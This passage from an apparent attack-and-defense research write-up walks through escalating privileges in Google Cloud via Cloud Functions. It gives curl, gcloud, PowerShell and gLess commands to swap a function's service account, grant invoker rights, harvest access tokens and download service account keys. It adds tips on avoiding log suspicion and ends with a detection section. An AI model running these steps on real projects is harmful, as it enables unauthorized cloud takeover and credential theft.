        "serviceAccountEmail": "<service-account-email>",
        "sourceArchiveUrl": "<gs-link-to-zipped-sourcecode>"
      }' \
  "https://cloudfunctions.googleapis.com/v1/projects/<project-id>/locations/<region>/functions/<function-name>?updateMask=entryPoint,runtime,serviceAccountEmail,sourceArchiveUrl"
```
Here's the one liner which can run in `cmd` without any errors.

Update a single Parameter (In this case: serviceAccountEmail):
```shell
curl -X PATCH -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -d "{\"serviceAccountEmail\": \"<service-account-email>\"}" "https://cloudfunctions.googleapis.com/v1/projects/<project-id>/locations/<region>/functions/<function-name>?updateMask=serviceAccountEmail"
```
Update multiple Parameter (In this case: entryPoint,runtime,serviceAccountEmail,sourceArchiveUrl):
```shell
curl -X PATCH -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -d "{\"entryPoint\": \"<function-entrypoint>\", \"runtime\": \"python38\", \"serviceAccountEmail\": \"<service-account-email>\", \"sourceArchiveUrl\": \"<gs-link-to-zipped-sourcecode>\"}" "https://cloudfunctions.googleapis.com/v1/projects/<project-id>/locations/<region>/functions/<function-name>?updateMask=entryPoint,runtime,serviceAccountEmail,sourceArchiveUrl"
```

<p>
  <img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/PrivEsc-via-CloudFunction/39.png">
</p>

Modify the parameters according to your need

<table>
  <tr>
   <td>&lt;token> 
   </td>
   <td>&lt;token> is a placeholder for an actual authorization token that is required to authenticate and authorize the API request. Run the command 
"**gcloud auth application-default print-access-token**" to get the token.
   </td>
  </tr>
  <tr>
   <td>&lt;project-id>
   </td>
   <td>The ID of the Google Cloud project in which the Cloud Function exists.
   </td>
  </tr>
  <tr>
   <td>&lt;region>
   </td>
   <td>The region where the Cloud Function exists. For example, "us-central1".
   </td>
  </tr>
  <tr>
   <td>&lt;function-name>
   </td>
   <td>The name of the Cloud Function to update.
   </td>
  </tr>
  <tr>
   <td>&lt;function-entrypoint>
   </td>
   <td>The name of the entry point function for the Cloud Function. This is the function that will be executed when the Cloud Function is triggered.
   </td>
  </tr>
  <tr>
   <td>&lt;service-account-email>
   </td>
   <td>The email address of the service account that will be used to run the Cloud Function. Choosing a Service Account with high privileges will help you Privilege Escalate easier.
   </td>
  </tr>
  <tr>
   <td>&lt;gs-link-to-zipped-sourcecode>
   </td>
   <td>The URL of the Cloud Storage archive file that contains the source code for the Cloud Function. The archive file must be in ZIP format. Example: gs://bucket-name/code.zip
   </td>
  </tr>
</table>

For some reason if invoking the function leads to the following error: *Your client does not have permission to get URL.* could mean two things: either the Function is private, which means only specific principals have access to it or the role:"Cloud Function Invoker" is not assigned to anyone. Not a problem because you can update the permission as well or add to it. The next phase walks you through it. 
<p>
  <img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/PrivEsc-via-CloudFunction/24.png">
</p>

## Phase II - Ways to Set IAM Policy Binding to a Cloud Function in Google Cloud Platform

Creating/Deploying a Cloud Function is just the first step in the process. Making it available for invocation is the second.

When you create a Cloud Function in GCP, it is not immediately accessible for invocation. Before you can invoke the function, you need to set up the necessary IAM permissions to allow access to the function and control who has access to your Cloud Function and what they can do with it.

To set up IAM permissions for your Cloud Function, you can add one or more members to a Cloud Function's IAM policy. Members can be individual user accounts, groups of users, or service accounts. You can assign roles to these members, which determine the actions they can perform on the function. 

Now, there's a special member called `allUsers` that represents anyone on the internet. You can grant the member : `allUsers` the role : `Cloud Function Invoker`. This will allow anyone on the internet to invoke the Cloud Function without requiring authentication. However we'll stick to giving a specific service account the permission `Cloud Function Invoker`. 
Invoking a Cloud Function using the `allUsers` binding, will let the function's logs show the request coming from an unauthenticated source, making it suspicious in some cases. On the other hand, if a service account is used, the logs will show request coming from an authorized source, reducing any suspicion.

### APIs and Permissions Required to Set IAM Policy Binding to a Cloud Function via gCloud & Cloud Function API (gRPC & REST)

**List of APIs that needs to be enabled to "Bind an IAM Policy to a Cloud Function via gCloud"**
<table>
  <tr>
    <td>cloudfunctions.googleapis.com (Cloud Functions API)</td>
  </tr>
  <tr>
    <td>cloudbuild.googleapis.com (Cloud Build API)</td>
  </tr>
  <tr>
    <td>cloudresourcemanager.googleapis.com (Cloud Resource Manager API)</td>
  </tr>
</table>

**List of APIs that needs to be enabled to "Bind an IAM Policy to a Cloud Function via Cloud Function API (gRPC & REST)"**
<table>
  <tr>
    <td>cloudfunctions.googleapis.com (Cloud Functions API)</td>
  </tr>
  <tr>
    <td>cloudbuild.googleapis.com (Cloud Build API)</td>
  </tr>
</table>

In order to grant the "Principals" a "Role", the user or service account performing the operation must have the certain permissions as listed in the table below. 
Here's the list of permissions required to bind an IAM Policy of a certain principal (user/group/allUsers etc) and role `Cloud Function Invoker`:

<table>
  <tr>
   <td colspan="3" align="center"><strong>Binding IAM Policy via gCloud</strong></td>
  </tr>
  <td>cloudfunctions.functions.getIamPolicy</td>
  <tr>
  <td>cloudfunctions.functions.setIamPolicy</td>
</table>

<table style="float: left">
  <tr>
   <td colspan="3"align="center"><strong>Binding IAM Policy via Cloud Function API (REST & gRPC)</strong></td>
  </tr>
  <td>cloudfunctions.functions.setIamPolicy</td>
</table>

Here's an image to understand it better.

<p>
  <img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/PrivEsc-via-CloudFunction/10a.jpg">
</p>

Once again Cloud Function API (REST & gRPC) stands out as it requires less amount of permission to give a member or group the role `Cloud Function Invoker` to Invoke a Cloud Function. 

### Setting IAM Policy Binding to the Cloud Function via gCloud

Anyways here's the gCloud command that grants `Cloud Function Invoker` role to a member/group. 

```shell
gcloud functions add-iam-policy-binding <function-name> --region=<region> --member=allUsers --role=roles/cloudfunctions.invoker
```
Above gCloud command grants the principal:"allUsers" the role:"Cloud Function Invoker", it binds the Policy to the resource:"Google Cloud Functions" , allowing all users, even unauthenticated (--member=allUsers) to invoke the specified function (&lt;function-name>) in the specified region (--region=&lt;region>). 

Here's the gCloud command that grants `Cloud Function Invoker` role to a Service Account.
  
```shell
gcloud functions add-iam-policy-binding <function-name> --region=<region> --member="serviceAccount:<service_account>" --role="roles/cloudfunctions.invoker"
```
<table>
 <tr>
   <td>&lt;function-name>
   </td>
   <td>The name of the Cloud Function created.
   </td>
  </tr>
  <tr>
   <td>&lt;region>
   </td>
   <td>The region where the Cloud Function was deployed. For example, "us-central1".
   </td>
  </tr>
  <tr>
   <td>&lt;service-account>
   </td>
   <td>Service Account you want to grant "Cloud Function Invoker" role to.
   </td>
  </tr>
  </table>
 
gCloud requires you to have both `cloudfunctions.functions.getIamPolicy` & `cloudfunctions.functions.setIamPolicy` permissions to successfully bind an IAM Policy to a function. There is no need for `cloudfunctions.functions.getIamPolicy` permission in setting an IAM Policy, `cloudfunctions.functions.setIamPolicy` is the one that sets it, let's narrow down the permission to just `cloudfunctions.functions.setIamPolicy`, using Cloud Function API.

### Setting IAM Policy Binding to the Cloud Function via Cloud Function API (REST)

curl command that binds the policy principal:"allUsers" and role:"Cloud Function Invoker" to a Cloud Function:
  
```shell
curl -X POST \
     -H "Authorization: Bearer <token>" \
     -H "Content-Type: application/json" \
     -d '{
          "policy": {
            "bindings": [
              {
                "role": "roles/cloudfunctions.invoker",
                "members": [
                  "allUsers"
                ]
              }
            ],
            "version": 3
          }
        }' \
     https://cloudfunctions.googleapis.com/v1/projects/<project-id>/locations/<region>/functions/<function-name>:setIamPolicy
```
Here's the one liner which can run in `cmd` without any errors.

```shell
curl -X POST -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -d "{\"policy\":{\"bindings\":[{\"role\":\"roles/cloudfunctions.invoker\",\"members\":[\"allUsers\"]}],\"version\":3}}" https://cloudfunctions.googleapis.com/v1/projects/<project-id>/locations/<region>/functions/<function-name>:setIamPolicy
```
>Note: You can't input a Service Account in place of allUsers as principal name and expect it to work because in GCP IAM, members are identified using a prefix that specifies the type of the member, such as user: for a Google account, group: for a Google group, or serviceAccount: for a service account. Thus when a specific service account is being added in the policy it should have a prefix "serviceAccount" same goes for user and group.

curl command that binds the policy principal:"&lt;service-account>" and role:"Cloud Function Invoker" to a Cloud Function:

```shell
curl -X POST \
     -H "Authorization: Bearer <token>" \
     -H "Content-Type: application/json" \
     -d '{
          "policy": {
            "bindings": [
              {
                "role": "roles/cloudfunctions.invoker",
                "members": [
                  "serviceAccount:<service-account>"
                ]
              }
            ],
            "version": 3
          }
        }' \
     https://cloudfunctions.googleapis.com/v1/projects/<project-id>/locations/<region>/functions/<function-name>:setIamPolicy
```
Here's the one liner which can run in `cmd` without any errors.

```shell
curl -X POST -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -d "{\"policy\":{\"bindings\":[{\"role\":\"roles/cloudfunctions.invoker\",\"members\":[\"serviceAccount:<service-account>\"]}],\"version\":3}}" https://cloudfunctions.googleapis.com/v1/projects/<project-id>/locations/<region>/functions/<function-name>:setIamPolicy
```

Modify the parameters according to your need

<table>
  <tr>
   <td>&lt;token> 
   </td>
   <td>&lt;token> is a placeholder for an actual authorization token that is required to authenticate and authorize the API request. 
   <br>Run the command "<strong>gcloud auth application-default print-access-token</strong>" to get the token.
   </td>
  </tr>
  <tr>
   <td>&lt;project-id>
   </td>
   <td>The ID of the Google Cloud project in which the Cloud Function was created.
   </td>
  </tr>
  <tr>
   <td>&lt;region>
   </td>
   <td>The region where the Cloud Function was deployed.
   </td>
  </tr>
  <tr>
   <td>&lt;function-name>
   </td>
   <td>The name of the Cloud Function.
   </td>
  </tr>
  <tr>
   <td>&lt;service-account>
   </td>
   <td>The name of the Service Account to grant "Cloud Function Invoke" role.
   </td>
  </tr>
</table>

### Setting IAM Policy Binding to the Cloud Function via Cloud Function API (gRPC)

We'll be using [gLess](https://github.com/anrbn/gLess) to add the IAM policy binding of principal:"allUsers/Service Account" and role:"Cloud Function Invoker" to the Cloud Function. gLess will set the IAM Binding successfully only if you're passing a Service Account as prinicpal or passing "allUsers". 

```powershell
py.exe .\main.py --project-id <project-id> --location <region> --function-name <function> --setiambinding <principal>
py.exe .\main.py --project-id <project-id> --location <region> --function-name <function> --setiambinding allUsers
```
<p>
  <img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/PrivEsc-via-CloudFunction/28.1.png">
</p>
<p>
  <img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/PrivEsc-via-CloudFunction/27.png">
</p>

### Invoking the Cloud Function
With the required access in place we can Invoke the Cloud Function. There are two ways to Invoke Cloud Function depending on whether an Authenticated user (Service Account, Group, User) or Unauthenticated user (allUsers) is given the Role:"Cloud Function Invoker".

For Unauthenticated Users (allUsers):

```shell
curl <function-invocation-url>
```

<p>
  <img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/PrivEsc-via-CloudFunction/29.png">
</p>

For Authenticated Users (Service Account, Group, User):

```powershell
$accessToken = $(gcloud auth print-identity-token)
$headers = @{
    "Authorization" = "bearer $accessToken"
    "Content-Type" = "application/json"
}
$body = '{}'
$response = Invoke-RestMethod -Method POST -Uri '<function-invocation-url>' -Headers $headers -Body $body -TimeoutSec 70
Write-Output $response.access_token
```
<p>
  <img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/PrivEsc-via-CloudFunction/30.png">
</p>
  
Use the command below for Unix based OS.
```shell
access_token=$(gcloud auth print-identity-token)
headers="Authorization: bearer ${access_token}"
headers="${headers}"$'\n'"Content-Type: application/json"
body='{}'
response=$(curl -sS -X POST -H "${headers}" -d "${body}" -m 70 '<function-invocation-url>')
echo "${response}" | jq -r '.access_token'
``` 

## Phase III - Privilege Escalation via Cloud Function in Google Cloud Platform

Whatever was researched and learned will all be put together to Escalate from a low privileged Service Account to a privileged Service Account.

To Privilege Escalate via Cloud Function in Google Cloud Platform we'll be taking the path with least permissions required. From what we've seen, the only method that can let us do more with less permission is the Cloud Function API. We'll be calling the Cloud Function API via gRPC from this section on. Since we will be using gRPC it makes proper sense to put [gLess](https://github.com/anrbn/gLess) into action. 

*Scenario: An attacker has gained access to a Service Account key by exploiting a vulnerable CI/CD pipeline or through a successful phishing attack on a developer etc. He logged in with the key using the gcloud CLI and discovered that the service account has limited privileges. From here on out he can Privilege Escalate via various methods, one being Cloud Function. If he chooses to PrivEsc via Cloud Function, he will have two ways to do it.*     
Either:
- Deploy a New Cloud Function + Set an IAM Policy Binding to it.
- Update an Existing Cloud Function + Set an IAM Policy Binding to it (Optional).

> Note: Why setting an IAM Policy Binding to an already existing function is optional because if a function already exists then chances are it is already invokable by authenticated or non-authenticated principals. The Function could be public which means anyone can access the function. But in some cases the function could be private which means only a certain user, group or service account has access to the function. In that case you'd need to update the IAM Policy Binding to the Cloud Function. 

We'll be using [gLess](https://github.com/anrbn/gLess) to Deploy, Update, List Details and Set IAM Policy Binding to the Cloud Function using Cloud Function API (gRPC). 
  
If you wish to utilize the REST API for this purpose, then you could use the above curl commands which use REST API or use these set of exceptional [scripts](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/tree/master/ExploitScripts) developed by Rhino Security Labs which does all of the below actions via REST API.

Permissions required for Deploying a Cloud Function via Cloud Function API 
- `iam.serviceAccounts.actAs`
- `cloudfunctions.functions.create`

Permissions required to set IAM Policy Binding to the Cloud Function via Cloud Function API 
- `cloudfunctions.functions.setIamPolicy`

Permissions required for Updating a Cloud Function via Cloud Function API 
- `iam.serviceAccounts.actAs`
- `cloudfunctions.functions.update`

Permissions required for Listing Cloud Functions via Cloud Function API (Optional) 
- `cloudfunctions.functions.list`

>Note: One can use either gRPC or REST to make requests to the Cloud Function API, the Cloud Function API will then interact with the Cloud Functions service. The Permissions required to Deploy, Update and Set IAM Policy Binding are the same for both gRPC and REST.

### Deploying the Cloud Function via Cloud Function API (gRPC)

We'll be deploying a new cloud function called "lets-attack"

Command: 
```powershell
py.exe .\main.py --project-id <project-id> --location <region> --function-name <function-name> --gsutil-uri <gsutil-uri> --function-entry-point <entry-point> --service-account <sa-account> --deploy
```
<p>
  <img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/PrivEsc-via-CloudFunction/40.png">
</p>

### Listing the Cloud Functions via Cloud Function API (gRPC)
Command: 
```powershell
py.exe .\main.py --project-id <project-id> --list
```
<p>
  <img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/PrivEsc-via-CloudFunction/37.png">
</p>

### Updating the Cloud Function via Cloud Function API (gRPC)
Command: 
```powershell
py.exe .\main.py --project-id <project-id> --location <region> --function-name <function-name> --gsutil-uri <gsutil-uri> --function-entry-point <entry-point> --service-account <sa-account> --update
```

From the listed functions let's go with "function-1". We will update the function to add a new Service Account which has Editor Role in the project. The Function will now be updated, if we be specific then its actually just the Function's Service Account being updated.

<p>
  <img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/PrivEsc-via-CloudFunction/38.png">
</p>

### Setting IAM Policy Binding to the Cloud Function via Cloud Function API (gRPC)

Incase after update you still can't invoke the function, then go ahead bind an IAM Policy to the Cloud Function. Incase you've deployed a new function you'll have set an IAM Policy regardless.

Command: 
```powershell
py.exe .\main.py --project-id <project-id> --location <region> --function-name <function> --setiambinding <principal>
```
We'll set an IAM Binding of Policy { member:"&lt;myserviceaccount>" and role:"Cloud Function Invoker" }  to both the Cloud Functions created and updated.

<p>
  <img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/PrivEsc-via-CloudFunction/41.png">
</p>

Finally we can invoke the code and retrieve the *access_token* to use for privilege escalation.

<p>
  <img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/PrivEsc-via-CloudFunction/42.1.png">
</p>

### Escalating Privilege to a High Level Service Account

With the access to the *access_token* what can we do? Well, a lot. One being authenticating and accessing various GCP APIs, services and resources, such as Google Cloud Storage, Google Cloud Compute Engine, and Google Kubernetes Engine etc. The gCloud argument --access-token-file let's us specify a file which has the *access_token* and then allows you to perform actions and access resources in GCP as the user or service account associated with the token. 

Below is a Powershell Command that will put the the *access_token* into a txt file, to be used later with gCloud.

```powershell
$response = Invoke-WebRequest -Uri "https://<function-region>-<project-id>.cloudfunctions.net/<function-name>" -UseBasicParsing
$jsonResponse = $response | ConvertFrom-Json
$accessToken = $jsonResponse.access_token
$accessToken | Out-File -FilePath "code.txt"
```
Example Usage:

```shell
gcloud projects list --access-token-file=code.txt
gcloud projects list --access-token-file=C:\Users\Administrator\code.txt
```
>You might encounter an error *"ERROR: gcloud crashed (UnicodeDecodeError): 'utf-8' codec can't decode byte 0xff in position 0: invalid start byte"* if you use the above command. This has something to do with the gCloud version in use.

There's another way to make use of *access_token* and that is to download the Service Account Key in JSON format. It could be any Key, Service Account you just compromised or Service Account Key with high privileges. We can then use gCloud to activate the Service Account Key and make requests, access the GCP Resources without any errors. 

[gLess](https://github.com/anrbn/gLess) communicates to the Identity and Access Management (IAM) API via gRPC and lets you to create and download the Service Account Key in JSON Format. 

Once you've downloaded the JSON Key file for the Service Account you can authenticate and activate it via gCloud. 

Command to Activate the Service Account via gcloud:

```shell
gcloud auth activate-service-account --key-file="C:/Users/Administrator/Downloads/service_account.json" 
```
<p>
  <img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/PrivEsc-via-CloudFunction/17.png">
</p>

After you've activated the Service Account, you can now run commands as the activated service account user. If the Service Account has Editor level permission one can perform a wide range of actions on Google Cloud resources without any restrictions.

# Detect

### Manual Source Code Review (Inefficient)

Detecting this attack is quite complicated due to lack of Log Sources. Google has no logging for detecting any requests made to the Metadata Server letting the attacker fly under the radar. However there is a working manual detection discussed in this part. 

Below is an image which lays out every possible path an attacker can take to get access to an *access_token*. 

<p>
  <img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/PrivEsc-via-CloudFunction/44a.jpg">
</p>

> Download the pdf and zoom in to see the details. ([File](https://github.com/anrbn/GCP-Attack-Defense/blob/main/misc/CloudFunction/PrivEsc-via-CloudFunction/attack-path.pdf))

If you look at the image carefully you'd find, from Deploying/Updating to Invoking the Function every action done is normal and can be done by a legitimate user as well. So how do we detect this? 

There's a thing in Detection Engineering, if something doesn't make sense, take the end result and start looking at the scenario from backwards. You'd eventually arrive at a conclusion.

The Attacker's end result was to Escalate Privileges. So, I took the end result (Privilege Escalation) and started to question my way backwards.

**Question:** How did the attacker escalate privileges? Well, he got access to the *access_token* and then used it to escalate privileges. 

**Question:** How did the attacker got access to the *access_token*? He invoked the function and got the *access_token*.

<p>
  <img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/PrivEsc-via-CloudFunction/43.png">
</p>

**Question:** How does Invoking a Function get you the *access_token*? Well, there must be something in the Cloud Function that does that.

That something is the "Source Code", which prints the access_token. The root cause for the Attacker to successfully Privilege Escalate is the Cloud Function Source Code, which prints the *access_token*.

Once again let's work our way back.

**Question:** How does the Source Code in Cloud Function get access to the access_token? It sends HTTP GET request to the Metadata server to obtain an access token for the default service account of the current instance, which then is returned as the output of the function.

So a request is being sent to the Google Compute Engine metadata server. Can we detect Cloud Function sending request to the Metadata server? 

Unfortunately no, we can't. From what I've researched, Google doesn't log requests to the metadata server neither VPC Flow Logs nor Google Cloud Audit Logs gives any indication of the Cloud Function sending requests to the Metadata Server. This is a major deficiency in GCP Logging and Monitoring which can be exploited by attackers.

Since, the Source Code in Cloud Function is the root cause for the Privilege Escalation, we can analyze the source code itself to detect the attack. Now back to questions.

**Question:** Where does the Source Code reside apart from the Cloud Function? It resides in the Cloud Storage in ZIP Format inside a specific folder structure within the Google Cloud Storage bucket.

Function Structure: `gcf-sources-<project_number>-<region>/<function_name>-<unique_identifier>/<version>/function-source.zip`

<p>
  <img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/PrivEsc-via-CloudFunction/45.png">
</p>

<table>
  <tr>
   <td>&lt;project_number>
   </td>
   <td>Google Cloud project number. 
   <br>Run the command "<strong>gcloud projects describe <project-id> --format="value(projectNumber)"</strong>" to get Project Number.
   </td>
  </tr>
  <tr>
   <td>&lt;region>
   </td>
   <td>The region where Cloud Function is deployed.
   </td>
  </tr>
  <tr>
   <td>&lt;function_name>
   </td>
   <td>The name of the Cloud Function.
   </td>
  </tr>
  <tr>
   <td>&lt;unique_identifier>
   </td>
   <td>A unique identifier generated by Google Cloud for the specific Cloud Function.
   </td>
  </tr>
  <tr>
   <td>&lt;version>
   </td>
   <td>The version of the Cloud Function source code.
   </td>
  </tr>
</table>

Detection: 
1. One can implement automated tools and processes to identify potentially malicious code or security vulnerabilities in the source code. 
2. Pattern matching can be used to detect if the code is accessing the metadata server. 

However, a sophisticated attacker may attempt to obfuscate their code to hide any direct reference to the metadata server or use other methods to make it difficult to detect such requests in the source code. There is another technique I've researched **"Cloud Function Source Code Concealment"** , which let's attackers totally hide their malicious code with no artifact left that can point to the malicious source code. I'll be posting about it soon.

Detecting malicious source code by querying the Google Cloud Storage bucket might not be the most efficient or comprehensive approach, due to Google's Insufficient logging, attackers can leverage this technique and still stay under the radar. I hope Google brings logging any requests sent to the metadata server in the future.

## References and Resources

[Rhino Security Labs - Privilege Escalation in Google Cloud Platform – Part 1 (IAM)](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)
